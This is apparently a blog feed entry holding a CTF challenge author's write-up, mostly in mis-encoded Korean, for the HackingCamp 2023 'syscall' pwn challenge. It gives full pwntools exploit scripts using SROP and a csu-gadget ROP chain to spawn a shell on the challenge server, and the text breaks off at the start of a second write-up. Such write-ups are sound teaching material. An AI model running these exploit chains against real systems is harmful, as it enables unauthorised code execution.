        <content type="html"><![CDATA[<ul><li><a href="http://hackingcamp.org/">http://hackingcamp.org/</a></li></ul><p>ì˜¬í•´ë„ ì–´ê¹€ì—†ì´ í•´í‚¹ìº í”„ ë¬¸ì œ ì¶œì œë¥¼ í•˜ì˜€ë‹¤. ëŒ€íšŒ ì‹œê°„ì´ ê½¤ ì§§ê³  ë‹¤ë¥¸ ì–´ë ¤ìš´ í¬ë„ˆë¸” ë¬¸ì œê°€ ìžˆê¸° ë•Œë¬¸ì— ë¬¸ì œ í’€ì´ í•´ì£¼ì‹  ë¶„ë“¤ì€ í’€ì´ê°€ ìƒëŒ€ì ìœ¼ë¡œ ì‰¬ìš´ <code>Sigreturn-oriented programming(SROP)</code>ë¥¼ ì´ìš©í•˜ì—¬ ë¬¸ì œë¥¼ í’€ì´í•´ì£¼ì…¨ì„ ê²ƒì´ë¼ ìƒê°ëœë‹¤. ë‚˜ëŠ” ë¬¸ì œ ì¶œì œí•˜ë©´ì„œ ë‘ ê°€ì§€ ë°©ë²•ìœ¼ë¡œ í’€ì´í•˜ì˜€ê³  ì •ìž‘ <code>SROP</code>ëŠ” ìƒê°ì´ ë‚˜ì§€ ì•Šì•„ ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œ í‘¼ í›„ì— <code>SROP</code>ë¡œ í’€ì´í•˜ì˜€ë‹¤.</p><p>ë¡¸ì—…ì„ ìž‘ì„±í•˜ë©´ì„œ ìƒê°ë“  ê±´ë° seccompê³¼ ê°™ì€ ê²ƒì„ ë‘ì§€ ì•Šì•˜ìœ¼ë‹ˆ ì„œë²„ì— ì¡´ìž¬í•˜ëŠ” flag íŒŒì¼ì˜ ì´ë¦„ì„ ì•Œì•„ë‚¸ ë‹¤ìŒ, <code>openat, read, write</code> í•´ì„œ ë¬¸ì œë¥¼ í’€ì´í•  ìˆ˜ ìžˆì„ ê²ƒ ê°™ë‹¤. í•´ë‹¹ ë°©ë²•ì€ ì–¸ì¸í…ì´ ì•„ë‹ˆë©° ì´ˆì‹¬ìžë¥¼ ìœ„í•œ í•´í‚¹ìº í”„ ì·¨ì§€ì— ë§žê²Œ ë‹¤ì–‘í•œ í’€ì´ê°€ ê°€ëŠ¥í•˜ë„ë¡ ë³´í˜¸ ê¸°ë²•ì„ ê°•í•˜ê²Œ ì œí•œì„ ë‘ì§€ ì•Šì•˜ë‹¤. ê°œì¸ì ìœ¼ë¡œ flag ê°’ì„ ì½ì–´ì˜¤ëŠ” ê²ƒë³´ë‹¨ ì‰˜ ë”°ëŠ” ê²ƒì´ ë” ìž¬ë°Œê¸° ë•Œë¬¸ì—.. í•´ë‹¹ í’€ì´ëŠ” ì†Œê°œí•˜ì§€ ì•ŠëŠ”ë‹¤.</p><blockquote><p>ì›í•˜ëŠ” system callì„ ì‹¤í–‰ì‹œì¼œë³´ìž!<br><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a><br>tar -zxvf syscall-public.tar.gz</p></blockquote><ul><li>[ 3 solves &#x2F; 428 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = sys_write(<span class="number">1u</span>, gloabl_buf, <span class="number">0xC</span>uLL);</span><br><span class="line">  v4 = sys_read(<span class="number">0</span>, buf, <span class="number">0x250</span>uLL); <span class="comment">// overflow</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì „ì—­ë³€ìˆ˜ì— ì ížŒ ê°’ì„ ì¶œë ¥í•˜ê³ , ì§€ì—­ë³€ìˆ˜ì— ê°’ì„ ìž…ë ¥ ë°›ëŠ”ë° ì—¬ê¸°ì„œ overflowê°€ ëŒ€ë†“ê³  ë°œìƒí•œë‹¤. ì£¼ì–´ì§„ ì½”ë“œëŠ” ì´ê²Œ ë‹¤ê³ , ë‚´ê°€ ìž‘ì„±í•œ ê²ƒì„ ì¶œë ¥í•´ ì£¼ëŠ” ê¸°ëŠ¥ì´ í˜„ìž¬ë¡œì„  ì¡´ìž¬í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— ë­”ê°ˆ leakí•  ìˆ˜ë„ ì—†ì–´ ë³´ì¸ë‹¤. ê·¸ëŸ¬ë‚˜ í•¨ìˆ˜ ëª©ë¡ì„ ë³´ë©´ ì•„ëž˜ì™€ ê°™ì€ hint í•¨ìˆ˜ê°€ ì¡´ìž¬í•˜ê³  ìœ ìš©í•œ ê°€ì ¯ì´ ë³´ì¸ë‹¤. </p><img src="/images/230211-hcamp2023w-syscall/Screenshot 2023-02-11 at 14.33.13.png" width=500/><br><p>ë³´ê¸° ì‰½ê²Œ ë‚˜íƒ€ë‚´ë©´ ì•„ëž˜ ë‘ ê°€ì ¯ì´ ëˆˆì— ë³´ì¸ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add rax, 0x1 ; ret ;</span><br><span class="line">syscall ; ret ;</span><br></pre></td></tr></table></figure><p>ì´ê²ƒì„ ì´ìš©í•˜ì—¬ ìš°ë¦¬ëŠ” ì›í•˜ëŠ” system callì„ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìžˆë‹¤. ë¬¸ì œ ë°”ì´ë„ˆë¦¬ëŠ” 64bit ì „ìš© ELFì´ë‹ˆ ë¬¸ì œ ì„¤ëª…ì— ë‚˜ì™€ìžˆë˜ ì‚¬ì´íŠ¸ë¥¼ ì ‘ì†í•´ë³´ìž.</p><ul><li><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></li></ul><p>overflowë„ ë°œìƒí•˜ê² ë‹¤.. <code>rax</code> ë ˆì§€ìŠ¤í„°ë¥¼ ì¡°ìž‘í•˜ì—¬ ìš°ë¦¬ëŠ” ì € ì‚¬ì´íŠ¸ì— ìžˆëŠ” system callë“¤ì„ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìžˆë‹¤.</p><h2 id="Solve-1-Sigreturn-oriented-programming-SROP"><a href="#Solve-1-Sigreturn-oriented-programming-SROP" class="headerlink" title="Solve 1 (Sigreturn-oriented programming(SROP))"></a>Solve 1 (Sigreturn-oriented programming(SROP))</h2><ul><li>Sigreturn system callì„ ì‚¬ìš©í•˜ëŠ” ROP ê¸°ë²•</li></ul><p>í”„ë¡œê·¸ëž¨ì€ ë³´ì•ˆ, ìžì› ê´€ë¦¬ ë“±ì˜ ì´ìœ ë¡œ user modeì™€ kernel modeë¥¼ ì™”ë‹¤ê°”ë‹¤ í•˜ë©´ì„œ ì‹¤í–‰ë˜ëŠ”ë° ì´ ë•Œ ìžì› ê³µìœ ê°€ í•„ìš”í•˜ë‹¤. kernel modeì—ì„œ user modeë¡œ ê°ˆ ë•Œ <code>Sigreturn system call</code>ì„ ì´ìš©í•˜ì—¬ user modeì˜ ë ˆì§€ìŠ¤í„°ë¥¼ ì„¸íŒ…í•œë‹¤. ì € ì‹œìŠ¤í…œ ì½œì„ ì‚¬ìš©í•˜ì—¬ ë ˆì§€ìŠ¤í„°ë¥¼ ì„¸íŒ…í•  ë•Œ ê°’ì— ëŒ€í•œ ê²€ì¦ì´ ì´ë£¨ì–´ì§€ì§€ ì•ŠëŠ”ë‹¤. ê·¸ëž˜ì„œ ìš°ë¦¬ëŠ” <code>Sigreturn system call</code>ì„ ê°•ì œë¡œ í˜¸ì¶œí•˜ì—¬ ë ˆì§€ìŠ¤í„°ë¥¼ ë§ˆìŒëŒ€ë¡œ ë°”ê¿€ ìˆ˜ ìžˆë‹¤.</p><p><code>pwntools</code>ì˜ <code>frame = SigreturnFrame()</code>ì„ ì´ìš©í•˜ì—¬ ë§¤ìš° íŽ¸ë¦¬í•˜ê²Œ ì½”ë“œë¥¼ ìž‘ì„±í•  ìˆ˜ ìžˆë‹¤.</p><ul><li>exploit ì‹œë‚˜ë¦¬ì˜¤</li></ul><ol><li>ì „ì—­ë³€ìˆ˜ì— <code>/bin/sh\x00</code> ìž‘ì„± -&gt; <code>read(0, 0x404028, 8)</code></li><li>mainìœ¼ë¡œ ëŒë¦¼</li><li><code>SigreturnFrame()</code>ì„ ì´ìš©í•˜ì—¬ íŽ¸ë¦¬í•˜ê²Œ ë ˆì§€ìŠ¤í„° ì„¸íŒ… -&gt; <code>execve(&#39;/bin/sh\x00&#39;, 0, 0)</code>ì„ ì‹¤í–‰ì‹œí‚¤ê¸° ìœ„í•¨</li><li><code>execve(&#39;/bin/sh\x00&#39;, 0, 0)</code> ì‹¤í–‰</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;3.38.2.179&#x27;, 1337)</span></span><br><span class="line">p = remote(<span class="string">&#x27;3.38.2.179&#x27;</span>, <span class="number">32860</span>)</span><br><span class="line"></span><br><span class="line">add_rax = <span class="number">0x40110e</span></span><br><span class="line">syscall = <span class="number">0x401113</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4011c1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== first main ====================</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0, 0x404028, 8)</span></span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x404028</span>) <span class="comment"># bss</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;!&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== second main ====================</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = <span class="number">0x404028</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rax = 0x0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xf</span>): </span><br><span class="line">    payload += p64(add_rax)</span><br><span class="line"></span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Solve-2-run-execute-â€˜-x2F-bin-x2F-sh-x00â€™-0-0"><a href="#Solve-2-run-execute-â€˜-x2F-bin-x2F-sh-x00â€™-0-0" class="headerlink" title="Solve 2 (run execute(â€˜&#x2F;bin&#x2F;sh\x00â€™, 0, 0))"></a>Solve 2 (run execute(â€˜&#x2F;bin&#x2F;sh\x00â€™, 0, 0))</h2><p>SROP ê¸°ë²•ì„ ì´ìš©í•˜ì§€ ì•Šê³  <code>execute(&#39;/bin/sh\x00&#39;, 0, 0)</code>ì„ ì‹¤í–‰ì‹œí‚¤ëŠ” ê²ƒì„ ëª©í‘œë¡œ ë‘ëŠ” í’€ì´ì´ë‹¤. </p><ol><li><p><code>write(1, stackì£¼ì†Œ, ?)</code> í˜¸ì¶œ<br>main í•¨ìˆ˜ì—ì„œ <code>sys_read(0, buf, 0x250uLL);</code> ì‹¤í–‰í•˜ê³  ë‚œ ë’¤ê¸° ë•Œë¬¸ì— <code>rax</code> ë ˆì§€ìŠ¤í„°ì™€ <code>rdi</code> ë ˆì§€ìŠ¤í„°ë§Œ ìˆ˜ì •í•´ì„œ <code>write</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ stack ì£¼ì†Œë¥¼ leakí•  ìˆ˜ ìžˆë‹¤. (stackì— ì“°ì—¬ì§„ ê±´ ëª¨ë‘ leakí•  ìˆ˜ ìžˆê³  stackì—ëŠ” stack ì£¼ì†Œë„ ëŒ€ë¶€ë¶„ ì í˜€ìžˆë‹¤.)</p></li><li><p><code>read(0, 0x404028, 8)</code> í˜¸ì¶œ<br>bss ì˜ì—­ì— â€˜&#x2F;bin&#x2F;sh\x00â€™ì„ ì“¸ ê²ƒì´ë‹¤. ì“°ê³  ë‚œ í›„ <code>execute(&#39;/bin/sh\x00&#39;, 0, 0)</code>ì„ ì‹¤í–‰í•  ì˜ˆì •ì´ë‹¤.</p></li><li><p><code>execute(&#39;/bin/sh\x00&#39;, 0, 0)</code> í˜¸ì¶œ<br>ì¸ìž ì„¸ ê°œë¥¼ ì¡°ì ˆí•´ì•¼ í•œë‹¤. ì´ ë•Œ <code>rdx</code>ë¥¼ ì¡°ì ˆí•˜ê¸° ì ë‹¹í•œ ê°€ì ¯ì´ ì—†ì–´ì„œ <code>csu gadget</code>ì„ ì´ìš©í•˜ì˜€ë‹¤.</p></li></ol><img src="/images/230211-hcamp2023w-syscall/Screenshot 2023-02-11 at 15.09.07.png" width=600/><p>ì´ ë•Œ <code>[r15 + rbx*8]</code> ì—ëŠ” í˜„ìž¬ ìž‘ì„±í•œ payloadì˜ ì•„ëž˜ ë¶€ë¶„ì„ ìž‘ì„±í•´ì£¼ëŠ” ê²ƒì´ ìœ ë¦¬í•˜ë‹¤. 1ë²ˆ ê³¼ì •ì—ì„œ stack ì£¼ì†Œë¥¼ leakí–ˆìœ¼ë‹ˆ ìš°ë¦¬ payloadê°€ ì–´ëŠ ì£¼ì†Œì— ì ížŒì§€ë„ êµ¬í•  ìˆ˜ ìžˆë‹¤. ìµìŠ¤ ì½”ë“œ ì£¼ì„ì„ ë³´ë©´ ë‚˜ëŠ” <code>rdi</code> ë ˆì§€ìŠ¤í„°ë¥¼ ì„¸íŒ…í•´ì£¼ëŠ” ê³³ì„ ê°€ë¦¬ì¼°ë‹¤. ì •ë¦¬í•˜ë©´ <code>csu</code> ê°€ì ¯ìœ¼ë¡œ <code>edi</code>, <code>rsi</code>, <code>rdx</code>Â ëª¨ë‘ ì„¸íŒ…í•  ìˆ˜ ìžˆëŠ”ë° ë‹¤ 0ìœ¼ë¡œ í•´ë†“ê³  í›„ì— <code>rdi</code>ë¥¼ ë‹¤ì‹œ ì„¸íŒ…í•´ì¤¬ë‹¤.</p><p>íŽ¸ë¦¬í•˜ê²Œ write, read, execute í•¨ìˆ˜ ìžì²´ë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì²˜ëŸ¼ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ìž‘ì„±í•˜ì˜€ì§€ë§Œ í˜¸ì¶œí•´ì•¼í•  ê²ƒì€ system callì´ë¼ëŠ” ê²ƒì„ ìžŠì§€ ë§ìž. system callì´ë‹ˆ ë§Œí¼ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ ì•ˆë˜ê³  ë¬¸ì œ ì„¤ëª…ì˜ ì‚¬ì´íŠ¸ë¥¼ ì°¸ê³ í•˜ì—¬ ì˜¬ë°”ë¥¸ ê°’ìœ¼ë¡œ <code>rax</code> ë ˆì§€ìŠ¤í„°ë¥¼ ì„¸íŒ…í•œ ë‹¤ìŒ <code>syscall</code> ê°€ì ¯ì„ í˜¸ì¶œí•´ì•¼ í•œë‹¤. ê·¸ë¦¬ê³  í˜„ìž¬ ë ˆì§€ìŠ¤í„°ì˜ ìƒí™©ì— ë§žê²Œ <code>add rax, 0x1 ; ret ;</code> ê°€ì ¯ì„ í˜¸ì¶œí•˜ìž. 0x3bë¡œ ì„¸íŒ…í•´ì¤˜ì•¼ í•œë‹¤ê³  ë¬´ìž‘ì • 0x3bë²ˆ í˜¸ì¶œí•˜ë©´ ì•ˆëœë‹¤ëŠ” ëœ»ì´ë‹¤. ì™œëƒí•˜ë©´ ê·¸ ë‹¹ì‹œ <code>rax</code> ë ˆì§€ìŠ¤í„°ê°€ 0ì´ëž€ ë³´ìž¥ì„ í•  ìˆ˜ ì—†ê¸° ë•Œë¬¸ì´ë‹¤. </p><h3 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line"><span class="comment"># p = remote(&#x27;3.38.2.179&#x27;, 1337)</span></span><br><span class="line">p = remote(<span class="string">&#x27;3.38.2.179&#x27;</span>, <span class="number">32860</span>)</span><br><span class="line"></span><br><span class="line">add_rax = <span class="number">0x40110e</span></span><br><span class="line">syscall = <span class="number">0x401113</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4011c1</span></span><br><span class="line">pop_rdi = <span class="number">0x4011c3</span></span><br><span class="line"></span><br><span class="line">csu_init = <span class="number">0x4011BA</span></span><br><span class="line">csu_call = <span class="number">0x4011A0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== first main ====================</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(add_rax)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv(<span class="number">0x68</span>)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== second main ====================</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0, 0x404028, 8)</span></span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x404028</span>) <span class="comment"># bss</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rdx = 0</span></span><br><span class="line">payload += p64(csu_init) <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># rbx</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># rbp</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># r12 (edi)</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># r13 (rsi)</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># r14 (rdx)</span></span><br><span class="line">payload += p64(stack - <span class="number">0x60</span>) <span class="comment"># [r15 + rbx*8] stack-0x60 = pop_rdi ...</span></span><br><span class="line"></span><br><span class="line">payload += p64(csu_call)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi) <span class="comment"># &lt;- stack-0x60 is here</span></span><br><span class="line">payload += p64(<span class="number">0x404028</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rax = 0x3b</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x33</span>): <span class="comment"># rax = 0x8</span></span><br><span class="line">    payload += p64(add_rax)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execve(&#x27;/bin/sh\x00&#x27;, 0, 0)</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HCAMP&#123;cf518127a07c471e00dcfca20a5ca08f&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> HCAMP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hacking Camp </tag>
            
            <tag> SROP </tag>
            
            <tag> csu gagdet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)</title>
      <link href="/230211-hcamp2023w-super_calculator/"/>
      <url>/230211-hcamp2023w-super_calculator/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://hackingcamp.org/">http://hackingcamp.org/</a></li></ul><p>ê°™ì€ Demon íŒ€ì˜ ìˆ˜ë¯¼ë‹˜ì´ ë‚´ì‹  ë¬¸ì œë‹¤. ëŒ€íšŒ ì „ì— ë¬¸ì œ ê²€ìˆ˜í•˜ë©´ì„œ ìŠ¤ìŠ¤ë¡œ í’€ì–´ë´¤ëŠ”ë° ì´ë•Œê¹Œì§€ í•œ ê²€ìˆ˜ ì¤‘ì—ì„œ ì„¸ ì†ê°€ë½ ì•ˆì— ë“¤ ì •ë„ë¡œ ìž¬ë°ŒëŠ” ë¬¸ì œì—¬ì„œ ë¸”ë¡œê·¸ì— ê¼­ ê¸°ë¡í•˜ê³  ì‹¶ì—ˆë‹¤. ì´ ë¬¸ì œë¥¼ í’€ë©´ì„œ ë””ë²„ê¹…ì„ êµ‰ìž¥ížˆ ë§Žì´ í•˜ì˜€ë‹¤.. ë¯¸ë¦¬ ìŠ¤í¬í•˜ìžë©´ ì´ ë¬¸ì œëŠ” Chromeì€ ì•„ë‹ˆì§€ë§Œ Chrome 1-dayì™€ ê´€ë ¨ìžˆëŠ”ë° ë‚˜ì¤‘ì— ì‹œê°„ì´ ë‚œë‹¤ë©´.. ê´€ë ¨ ë‚´ìš©ì„ ë¸”ë¡œê·¸ì— ì ì–´ ê³µìœ í• ê¹Œ ì‹¶ê¸°ë„ í•œë‹¤. (ì•ˆ í•  ìˆ˜ë„ ìžˆë‹¤.)</p><blockquote><p>Hello my name is Calculator</p></blockquote><ul><li>[ 1 solves &#x2F; 500 points]</li></ul><p>ì•„ëž˜ëŠ” solveê°€ 0ì¼ ë•Œ ë‚˜ì˜¨ ížŒíŠ¸ì´ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ref. 1day Vulnerbility : https://bugs.chromium.org/p/chromium/issues/detail?id=1315192 (type confusion lead to oob)</span><br><span class="line"></span><br><span class="line">Hint : Static_cast, C++, NaN, Infinity, Buffer Overflow</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>main ë¶€í„° ì‚´íŽ´ë´¤ë‹¤. (ë¶„ì„í•˜ë©´ì„œ call_numì˜ íƒ€ìž…ì„ structë¥¼ í•˜ë‚˜ ìƒˆë¡œ ë§Œë“¤ì–´ì„œ ì§€ì •í•´ì£¼ì—ˆë‹¤.)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">v10 = <span class="number">0</span>;</span><br><span class="line">cal_num = <span class="built_in">malloc</span>(<span 